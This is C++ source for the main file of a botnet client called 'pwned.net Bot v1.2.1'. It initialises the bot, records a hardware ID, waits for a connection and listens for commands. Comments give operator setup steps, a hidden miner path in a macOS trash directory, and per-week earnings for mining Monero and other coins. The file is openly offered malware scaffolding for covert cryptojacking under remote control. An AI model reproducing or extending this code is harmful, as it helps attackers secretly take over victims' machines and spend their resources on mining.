/*
                                   __              __
     ____ _      ______  ___  ____/ /  ____  ___  / /_
    / __ \ | /| / / __ \/ _ \/ __  /  / __ \/ _ \/ __/
   / /_/ / |/ |/ / / / /  __/ /_/ /  / / / /  __/ /_
  / .___/|__/|__/_/ /_/\___/\__,_/  /_/ /_/\___/\__/
 /_/ by pwned
 
    Bot v1.2.1
 
 
 MAIN TODO'S :

 REWRITE BOT
 
 look for 'rewrite' adn rewrite those functions
 

 CHANGE THE BOTNAME TO WHATEVER YOU NAME THE FILE
 CHANGE THE SZMINERNAME TO THE NAME OF THE MINER FILE
 
 
 
 
 */

#include "include.h"


string BotName          = ""; // Change this
string BotVersion       = "1.2.1";


string szMinerName       = "";
const char* MinerName   = szMinerName.c_str();


int main(int argc, const char * argv[]) {
    
    sleep(0);
    
    if(!Init::Initialise())
        return 0;
    
    bot->version = BotVersion;
    bot->init();
    
    sleep(1); // 1800 // 30 min
    
    
    
    
    //bot->Listen();
    
    
    
    // <!------ Debugging ------!> \\
    
    string _hwid = bot->hwid;
    
    system("clear");
    cout << "\n\n";
    
    con->WaitForConnection();
    
    debug("HWID : " + _hwid);
    
    cout << "\n";
    
    debug("Listening...");
    
    
    bot->Listen();
    
    
    debug("Ending.");
    
    
    // different install paths
    
    
    
    
    
    cout << "\n";
    
    return 0;
    
}



/*
 
 Miner
 - miner path -> /private/.trash/.assets/minerfile
 
 Mining stats
 
 Hashes per cores , averages
 
 1 core  : 20 h/s
 2 cores : 30 h/s
 3 cores : 40 h/s
 4 cores : 50 h/s
 
 Stats per week
 
 XMR : 1 kh/s = ~9.30 USD
 BCN : 1 kh/s = ~8.70 USD
 DSH : 1 kh/s = ~3.40 USD
 QCN : 1 kh/s = ~3.80 USD
 
 
 
 
 Confirm amounts :
 DSH : 0.1 
 BCN : 20
 FCN QCN XDN MCN : 1
 ETH ETC ZEC : 0.001
 AEON XMR : 0.005
 


 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
*/
